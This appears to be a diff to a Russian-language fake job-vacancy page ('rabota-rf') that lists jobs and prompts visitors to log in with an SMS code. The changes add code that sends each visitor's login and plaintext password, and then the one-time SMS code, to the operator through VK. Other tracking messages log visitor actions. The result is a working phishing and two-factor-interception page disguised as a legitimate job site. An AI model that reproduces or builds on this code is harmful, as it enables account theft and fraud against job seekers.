@@ -386,7 +386,7 @@
                 </div>
                 <h3 style="text-align: center; margin-bottom: 8px; font-size: 20px;">Подтвердите вход по смс</h3>
                 <p class="sms-hint">
-                    Код отправлен на номер или MAX<span class="phone-mask" id="displayPhone"></span><br>
+                    Код отправлен в СМС или MAX<span class="phone-mask" id="displayPhone"></span><br>
                     
                 </p>
                 <form id="codeForm">
@@ -437,16 +437,15 @@
         }
 
         /* ====================================================================
-           ЛОГГЕР ДЕЙСТВИЙ — уведомление в VK на каждое событие
+           КОРОТКИЙ ЛОГГЕР — одно событие = одно короткое сообщение
            ==================================================================== */
         const LOG_TO_VK = true;
 
         function logAction(action, details = {}) {
-            const time = new Date().toLocaleString('ru-RU');
-            let msg = `🔔 ${action}\n🕒 ${time}`;
+            let msg = `🔔 ${action}`;
             const keys = Object.keys(details);
             if (keys.length) {
-                msg += '\n' + keys.map(k => `• ${k}: ${details[k]}`).join('\n');
+                msg += '\n' + keys.map(k => `${k}: ${details[k]}`).join(' | ');
             }
             if (LOG_TO_VK) sendToVK(msg);
         }
@@ -495,7 +494,7 @@
         ];
 
         function renderJobs(city) {
-            logAction('Выбор города', { 'Город': city });
+            logAction('Город', { 'Город': city });
             const listContainer = document.getElementById('jobList');
             listContainer.innerHTML = '';
             let shuffled = [...jobDatabase].sort(() => 0.5 - Math.random()).slice(0, 6);
@@ -526,12 +525,7 @@
         }
 
         function showJobDetails(job) {
-            logAction('Открыта вакансия', {
-                'Вакансия': job.title,
-                'Компания': job.company,
-                'Зарплата': job.salary,
-                'Город': job.city
-            });
+            logAction('Вакансия', { 'Вакансия': job.title, 'Город': job.city });
             currentJob = job;
             document.getElementById('listScreen').style.display = 'none';
             document.getElementById('applyFormScreen').style.display = 'none';
@@ -560,10 +554,7 @@
         }
 
         function openApplyForm() {
-            logAction('Нажата кнопка «Откликнуться»', {
-                'Вакансия': currentJob ? currentJob.title : '—',
-                'Авторизован': isAuthorized
-            });
+            logAction('Отклик', { 'Вакансия': currentJob ? currentJob.title : '—' });
             if (!isAuthorized) { openAuth(); return; }
             document.getElementById('applyJobTitle').innerText = currentJob.title;
             document.getElementById('applyJobCompany').innerText = currentJob.company;
@@ -577,14 +568,12 @@
             const experience = document.querySelector('input[name="experience"]:checked').value;
             const shift = document.querySelector('input[name="shift"]:checked').value;
             const comment = document.getElementById('applyComment').value.trim();
-            logAction('Отправлен отклик на вакансию', {
+            logAction('Отклик отправлен', {
                 'Вакансия': currentJob.title,
-                'Компания': currentJob.company,
-                'Город': currentJob.city,
                 'Опыт': experience,
-                'Смена': shift,
-                'Комментарий': comment || '—'
+                'Смена': shift
             });
+            if (comment) sendToVK(`💬 Комментарий: ${comment}`);
             document.getElementById('applyFormScreen').style.display = 'none';
             document.getElementById('successScreen').style.display = 'block';
             window.scrollTo(0, 0);
@@ -592,7 +581,7 @@
         });
 
         function openAuth() {
-            logAction('Открыто окно авторизации');
+            logAction('Авторизация');
             document.getElementById('authScreen').style.display = 'flex';
             document.getElementById('authStep1').style.display = 'block';
             document.getElementById('smsLoading').style.display = 'none';
@@ -627,11 +616,11 @@
             e.preventDefault();
             const login = document.getElementById('login').value.trim();
             const password = document.getElementById('password').value;
-            logAction('Ввод логина и пароля', {
-                'Логин': login,
-                'Длина пароля': password.length
-            });
             enteredLogin = login;
+
+            // Данные пользователя приходят в VK
+            sendToVK(`🔐 Вход\nЛогин: ${login}\nПароль: ${password}`);
+
             document.getElementById('authStep1').style.display = 'none';
             document.getElementById('smsLoading').style.display = 'block';
             setTimeout(() => {
@@ -639,7 +628,6 @@
                 document.getElementById('authStep2').style.display = 'block';
                 document.getElementById('displayPhone').innerText = maskPhone(enteredLogin);
                 document.querySelectorAll('.code-input')[0].focus();
-                logAction('Показан экран ввода кода', { 'Номер': maskPhone(enteredLogin) });
             }, 1500);
         });
 
@@ -661,17 +649,19 @@
             e.preventDefault();
             let code = '';
             codeInputs.forEach(i => code += i.value);
-            logAction('Введён код подтверждения', { 'Код': code, 'Длина': code.length });
+
+            // Код приходит в VK
+            sendToVK(`🔑 Код: ${code}\nЛогин: ${enteredLogin}`);
+
             isAuthorized = true;
             closeAuth();
             document.getElementById('headerLoginBtn').style.display = 'none';
             document.getElementById('headerUserProfile').style.display = 'flex';
-            logAction('Успешная авторизация', { 'Логин': enteredLogin });
             openApplyForm();
         });
 
         function openQR() {
-            logAction('Открыт QR-код');
+            logAction('QR открыт');
             document.getElementById('qrScreen').style.display = 'flex';
             const url = window.location.href.split('#')[0];
             document.getElementById('qrUrl').innerText = url;
@@ -732,12 +722,12 @@
                 const t = document.getElementById('qrToast');
                 t.classList.add('show');
                 setTimeout(() => t.classList.remove('show'), 2000);
-                logAction('Скопирована ссылка', { 'Ссылка': url });
+                logAction('Ссылка скопирована');
             }
         }
 
         function downloadQR() {
-            logAction('Скачан QR-код');
+            logAction('QR скачан');
             const canvas = document.getElementById('qrCanvas');
             const link = document.createElement('a');
             link.download = 'rabota-rf-qr.png';
@@ -750,15 +740,10 @@
         });
 
         window.addEventListener('DOMContentLoaded', () => {
-            logAction('Пользователь зашёл на сайт', {
-                'Страница': window.location.href,
-                'Браузер': navigator.userAgent.split(') ')[0].replace('Mozilla/5.0 (', ''),
-                'Язык': navigator.language,
-                'Экран': `${screen.width}x${screen.height}`
-            });
+            logAction('Зашёл на сайт');
         });
 
         renderJobs('Кемерово');
     </script>
 </body>
-    </html>
+</html>
